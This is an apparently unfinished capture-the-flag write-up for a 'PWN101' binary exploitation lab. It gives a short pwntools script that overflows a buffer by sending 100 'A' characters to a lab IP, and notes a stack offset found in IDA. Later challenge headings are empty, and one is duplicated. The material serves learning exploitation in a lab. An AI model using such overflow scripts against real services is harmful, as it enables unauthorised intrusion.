# PWN101

### Challenge 1 - pwn101
The goal of this task was simply to overflow the buffer, I found that 100 characters were more than enough to do that, so I developed the following code:

    from pwn import *
    
    ip = "10.10.114.216"
    port = 9001
    p = remote(ip,port)
    
    offset = 100
    payload = b"A"*offset
    
    p.sendline(payload)
    
    p.interactive()
![image](https://github.com/user-attachments/assets/2e84d354-224c-4fa8-b4b9-86305ffa26e5)<br />

### Challenge 2 - pwn101
Let's disassemble the binary in IDA:<br />
![image](https://github.com/user-attachments/assets/29a5aca3-d0a8-45cb-b047-ef27bc06936c)<br />
There's a buffer stored at rbp+var_70, and `var_70` is at -70h, which is 112 bytes from the beginning of the stack


### Challenge 3 - pwn101

### Challenge 4 - pwn101

### Challenge 5 - pwn101

### Challenge 6 - pwn101

### Challenge 7 - pwn101

### Challenge 8 - pwn101

### Challenge 8 - pwn101

### Challenge 10 - pwn101
